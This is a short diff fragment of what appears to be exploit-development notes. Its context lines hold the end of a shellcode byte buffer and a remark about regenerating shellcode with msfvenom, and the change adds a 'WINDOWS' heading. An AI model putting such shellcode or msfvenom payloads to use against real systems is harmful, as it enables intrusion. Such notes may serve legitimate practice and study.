@@ -62,3 +62,5 @@ buf += b"\x8b\xac\x33\x6e\x72\x0e\x5d\x08\x19\x21\xf3\xb2"
 buf += b"\xb4\xda\x0b\x6c\x14\xad\xed\x5f\x1a"
 
 sometimes i have to regenerate my shell code by running msfvenom command
+========================================================================================
+WINDOWS 
